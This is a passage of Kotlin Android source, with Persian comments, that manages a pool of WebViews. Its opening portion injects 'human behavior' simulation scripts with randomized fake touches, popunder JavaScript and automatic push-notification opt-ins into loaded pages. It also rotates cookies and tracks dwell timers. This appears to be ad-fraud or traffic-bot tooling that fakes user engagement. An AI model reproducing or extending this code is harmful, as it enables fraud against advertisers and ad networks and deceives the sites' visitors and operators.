                                        setTimeout(scheduleNextTouch, 20000 + Math.random() * 10000);
                                    }
                                };
                                setTimeout(startHBS2, 300 + Math.random() * 200);
                            })();
                            """.trimIndent(), null
                        )
                    }
                } catch (e: Throwable) { /* ignore */ }
            }, 500)

            if (behavior.triggerPopunder && behavior.popunderProbability > 0) {
                val popunderJS = HumanBehaviorSimulator.buildPopunderJS(
                    behavior.popunderDelayMs
                )
                view.evaluateJavascript(popunderJS, null)
                Log.d(TAG, "Popunder JS injected (delay=${behavior.popunderDelayMs}ms)")
            }

            if (behavior.pushNotificationOptIn) {
                val pushJS = HumanBehaviorSimulator.buildPushNotificationJS()
                view.evaluateJavascript(pushJS, null)
                Log.d(TAG, "Push notification JS injected")
            }

            Log.i(TAG, "Ad-network behavior injected: ${behavior.network.key}")
        } catch (e: Throwable) {
            Log.w(TAG, "Behavior injection failed: ${e.message}")
        }
    }

    // ═══════════════════════════════════════════════════════════════
    // WebView Pool Management — Dynamic Auto-Scaling
    // ═══════════════════════════════════════════════════════════════

    /**
     * [FIX #1] دریافت WebView از pool — WebView جدید از طریق Main Thread ساخته می‌شود.
     *
     * استراتژی:
     * 1. اگر WebView آزاد موجود است → reuse
     * 2. اگر تعداد کل < maxPoolSize → WebView جدید بساز (روی Main Thread)
     * 3. اگر auto-scaling فعال و OOM نیست → باز هم WebView جدید بساز
     * 4. اگر pool پر است → منتظر بمان تا یکی آزاد شود
     * 5. اگر timeout بگذرد → exception
     */
    private fun borrowWebView(ctx: Context): WebView {
        val deadline = System.currentTimeMillis() + acquireTimeoutMs

        synchronized(poolLock) {
            while (true) {
                if (shutdownMode) {
                    throw IllegalStateException("WebView host is shut down")
                }

                // 1. Try to reuse existing available WebView
                if (availableWebViews.isNotEmpty()) {
                    val wv = availableWebViews.removeAt(availableWebViews.size - 1)
                    inUseWebViews.add(wv)
                    totalAcquisitions.incrementAndGet()
                    updatePeakInUse()
                    logPoolState("ACQUIRE (reuse)")
                    return wv
                }

                // 2. Check if we can create a new WebView
                val canCreate = allWebViews.size < effectiveMaxPoolSize

                if (canCreate) {
                    val underPressure = isMemoryUnderPressure()
                    if (!underPressure || autoScalingEnabled) {
                        // [FIX #1] WebView creation MUST be on main thread
                        val wv = runOnMainThread {
                            WebView(ctx).apply {
                                isVerticalScrollBarEnabled = false
                                isHorizontalScrollBarEnabled = false
                            }
                        }
                        allWebViews.add(wv)
                        inUseWebViews.add(wv)
                        totalCreated.incrementAndGet()
                        totalAcquisitions.incrementAndGet()
                        updatePeakInUse()
                        logPoolState("ACQUIRE (new, pool=${allWebViews.size})")
                        return wv
                    }
                }

                // 3. Pool exhausted — wait until one becomes available
                if (autoScalingEnabled && !canCreate) {
                    Log.w(TAG, "borrowWebView: at capacity (${inUseWebViews.size}/${effectiveMaxPoolSize}), waiting...")
                } else if (!autoScalingEnabled && !canCreate) {
                    Log.w(TAG, "borrowWebView: pool exhausted (${inUseWebViews.size}/${effectiveMaxPoolSize}), waiting...")
                }

                logPoolState("WAIT")

                // Check timeout
                val remaining = deadline - System.currentTimeMillis()
                if (remaining <= 0) {
                    totalTimeouts.incrementAndGet()
                    logPoolState("TIMEOUT")
                    throw RuntimeException("WebView pool acquire timed out after ${acquireTimeoutMs}ms")
                }

                try {
                    (poolLock as java.lang.Object).wait(remaining.coerceAtMost(1000L))
                } catch (e: InterruptedException) {
                    Thread.currentThread().interrupt()
                    logPoolState("INTERRUPTED")
                    throw RuntimeException("WebView pool acquire interrupted", e)
                }
            }
        }
    }

    /**
     * [FIX #2+3] بازگشت WebView به Pool — با تخریب امن و بدون race condition.
     * [CRASH-FIX] Added session cancellation before return to prevent stale
     * dwell timer JS posts from reaching this WebView.
     */
    private fun returnWebView(wv: WebView, behavior: AdNetworkBehavior) {
        // [CRASH-FIX] Cancel the active session token FIRST, before pool operations,
        // so that any stale dwell timer posts check the flag and skip execution.
        webViewActiveSessions[wv]?.set(false)

        synchronized(poolLock) {
            // [FIX #3] Skip if already destroyed
            if (wv in destroyedWebViews) {
                Log.w(TAG, "returnWebView: WebView already destroyed, skipping")
                inUseWebViews.remove(wv)
                return
            }
            val wasInUse = inUseWebViews.remove(wv)
            if (!wasInUse) {
                Log.w(TAG, "returnWebView: WebView was not in use (double return?)")
                return
            }

            if (shutdownMode) {
                allWebViews.remove(wv)
                destroyWebViewSafe(wv)
                logPoolState("RELEASE (destroyed)")
                return
            }

            // Track return time for idle shrink
            webViewLastReturned[wv] = System.currentTimeMillis()
            availableWebViews.add(wv)
            logPoolState("RELEASE")
            (poolLock as java.lang.Object).notify()
        }

        // [CRASH-FIX] Cleanup WebView state on main thread with Throwable catch
        mainHandler.post {
            try {
                if (isDestroyed(wv)) return@post
                wv.stopLoading()
                wv.loadUrl("about:blank")
                CookieRotator.cleanupForPoolReturn(wv, behavior)
            } catch (e: Throwable) {
                Log.w(TAG, "webview cleanup error: ${e.message}")
            }
        }
    }

    /**
     * [FIX #2] تخریب همه WebView‌های موجود — همه روی Main Thread.
     */
    private fun destroyAvailableWebViews() {
        val toDestroy = mutableListOf<WebView>()
        synchronized(poolLock) {
            toDestroy.addAll(availableWebViews)
            availableWebViews.clear()
            allWebViews.removeAll(toDestroy)
        }
        for (wv in toDestroy) {
            destroyWebViewSafe(wv)
        }
        if (toDestroy.isNotEmpty()) {
            Log.i(TAG, "destroyAvailableWebViews: destroyed ${toDestroy.size} WebViews")
        }
    }

    // ═══════════════════════════════════════════════════════════════
    // Helper methods (all main-thread-safe via [runOnMainThread])
    // ═══════════════════════════════════════════════════════════════

    /**
     * [FIX #2] خواندن URL نهایی WebView از Main Thread.
     */
    private fun readFinalUrl(wv: WebView): String {
        return try {
            runOnMainThread { wv.url ?: "" }
        } catch (e: Throwable) {
            Log.w(TAG, "readFinalUrl failed: ${e.message}")
            ""
        }
    }

    /**
     * [FIX #2] خواندن User Agent از Main Thread.
     */
    private fun readUserAgent(wv: WebView): String {
        return try {
            runOnMainThread { wv.settings?.userAgentString ?: "" }
        } catch (e: Throwable) {
            Log.w(TAG, "readUserAgent failed: ${e.message}")
            ""
        }
    }

    private fun updatePeakInUse() {
        val current = inUseWebViews.size
        var peak: Int
        do {
            peak = peakInUse.get()
        } while (current > peak && !peakInUse.compareAndSet(peak, current))
    }

    // ═══════════════════════════════════════════════════════════════
    // Diagnostics & Logging
    // ═══════════════════════════════════════════════════════════════

    private fun logPoolState(action: String) {
        val used = inUseWebViews.size
        val avail = availableWebViews.size
        val total = allWebViews.size
        val peak = peakInUse.get()
        Log.d(TAG,
            "Pool [$action] inUse=$used available=$avail total=$total " +
            "peak=$peak created=${totalCreated.get()} destroyed=${totalDestroyed.get()} " +
            "acquisitions=${totalAcquisitions.get()} timeouts=${totalTimeouts.get()} " +
            "maxPool=${effectiveMaxPoolSize} oom=${totalOomEvents.get()} " +
            "jsErrors=${totalJsErrors.get()} loadErrors=${totalLoadErrors.get()}"
        )
    }

    @JvmStatic
    fun getPoolMetrics(): String {
        synchronized(poolLock) {
            val obj = JSONObject()
            obj.put("pool_config_min", minPoolSize)
            obj.put("pool_config_max", effectiveMaxPoolSize)
            obj.put("pool_config_idle_timeout_ms", idleTimeoutMs)
            obj.put("pool_config_acquire_timeout_ms", acquireTimeoutMs)
            obj.put("pool_config_auto_scaling", autoScalingEnabled)
            obj.put("in_use", inUseWebViews.size)
            obj.put("available", availableWebViews.size)
            obj.put("total_alive", allWebViews.size)
            obj.put("peak_in_use", peakInUse.get())
            obj.put("total_created", totalCreated.get())
            obj.put("total_destroyed", totalDestroyed.get())
            obj.put("total_acquisitions", totalAcquisitions.get())
            obj.put("total_timeouts", totalTimeouts.get())
            obj.put("total_oom_events", totalOomEvents.get())
            obj.put("memory_pressure", memoryPressureMode.get())
            obj.put("shutdown", shutdownMode)
            obj.put("total_js_errors", totalJsErrors.get())
            obj.put("total_load_errors", totalLoadErrors.get())
            obj.put("webview_version", detectWebViewVersion())
            obj.put("low_ram_device", isLowRamDevice())
            obj.put("cookie_stats", CookieRotator.getCookieStats())
            return obj.toString()
        }
    }

    /**
     * Get CookieRotator statistics for diagnostics.
     */
    @JvmStatic
    fun getCookieStats(): String {
        return CookieRotator.getCookieStats()
    }

    private fun escapeJson(s: String): String {
        return s.replace("\\", "\\\\")
            .replace("\"", "\\\"")
            .replace("\n", "\\n")
            .replace("\r", "\\r")
            .replace("\t", "\\t")
    }
}
